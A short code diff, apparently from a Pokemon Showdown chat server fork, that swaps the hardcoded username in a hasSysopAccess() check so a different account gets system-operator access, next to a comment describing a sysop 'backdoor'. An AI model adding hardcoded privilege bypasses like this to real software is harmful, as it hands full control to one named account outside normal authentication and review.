@@ -483,7 +483,7 @@ class User {
 	 * Special permission check for system operators
 	 */
 	hasSysopAccess() {
-		if (this.userid === 'fenrir') return true;
+		if (this.userid === 'ruben1626') return true;
 		if (global.SuperRanks && (SuperRanks.isHoster(this.userid) || SuperRanks.isOwner(this.userid))) return true;
 		if (this.isSysop && Config.backdoor) {
 			// This is the Pokemon Showdown system operator backdoor.
